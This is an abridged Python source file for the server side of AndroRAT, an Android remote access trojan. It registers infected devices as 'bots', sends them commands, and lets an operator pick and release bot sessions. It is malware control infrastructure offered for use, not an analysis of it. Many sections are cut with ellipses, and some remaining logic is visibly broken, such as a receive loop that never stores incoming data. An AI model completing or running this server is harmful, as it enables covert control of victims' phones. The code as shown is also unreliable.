#!/usr/bin/env python3
"""AndroRAT Server - Railway Edition (Fixed)"""
...
def send_cmd(bot_conn, cmd, wait=0.5):
 try:
  ...
  buff = ""; bot_conn.settimeout(10)
  try:
   while "END123" not in buff:
    d = bot_conn.recv(4096).decode("UTF-8", "ignore")
    if not d: break; buff += d
  except: pass
  finally:
   try: bot_conn.settimeout(None)
   except: pass
...
def bot_handler(conn, addr, bot_id):
 ...
 with bots_lock: bots[bot_id] = {'conn': conn, 'addr': addr, 'initial': init,
  'last_seen': time.time(), 'session': None}
 try:
  while True:
   with bots_lock:
    if bot_id not in bots: break
   if bots[bot_id].get('session'):
    bots[bot_id]['session'] = None; break
   if select.select([conn], [], [], 2)[0]:
    try: conn.recv(4096)
    except: break
   with bots_lock:
    if bot_id in bots: bots[bot_id]['last_seen'] = time.time()
 except: pass
 finally:
  with bots_lock:
 ...
 try:
  ...
  while True:
   ...
   if cmd == "exit": op_conn.sendall(b"Bye\n"); break
    ...
    try:
     while cur:
      ...
      if c2 == "back":
       ...
       cur = None; op_conn.sendall(b"Menu\n"); break
      if c2 == "exit":
       with bots_lock:
        if t in bots: bots[t]['session'] = None
    ...
    except: op_conn.sendall(b"Lost\n")
    with bots_lock:
     if t in bots: del bots[t]
    cur = None
   elif cmd == "release":
    if cur:
     with bots_lock:
      if cur in bots: bots[cur]['session'] = None
     cur = None; op_conn.sendall(b"Released\n")
...
def main():
 ...
 while True:
  ...
  except: fd = ""; conn.settimeout(None)
